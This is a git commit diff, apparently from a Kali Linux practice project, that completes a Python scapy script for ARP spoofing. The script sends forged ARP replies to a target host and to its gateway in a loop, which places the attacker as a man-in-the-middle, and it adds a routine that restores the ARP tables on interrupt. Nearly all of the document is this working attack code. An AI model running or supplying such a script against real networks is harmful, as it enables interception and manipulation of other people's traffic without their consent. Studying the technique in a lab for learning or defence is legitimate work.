2346263a5aae992c0127621a8424a98b7db1d007
root <root@kali.kali>
2026-08-10 19:56:19 -0400

    complete the project arp spoofing

--- pythonProject/arp_spoof/arp_spoof.py
+++ pythonProject/arp_spoof/arp_spoof.py
@@ -12,13 +12,28 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = "192.168.12.135"
+gateway_ip = "192.168.12.2"
+
 sent_packet_count = 0
-while True:
-    spoof("192.168.12.135", "192.168.12.2")
-    spoof("192.168.12.2", "192.168.12.135")
-    sent_packet_count = sent_packet_count + 2
-    print("[+] packets sent: " + str(sent_packet_count))
-    time.sleep(2)
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packet_count = sent_packet_count + 2
+        print("[+] packets sent: " + str(sent_packet_count), end="\r")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+]  Detected CTRL + C ... Resetting ARP tables... please wait.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
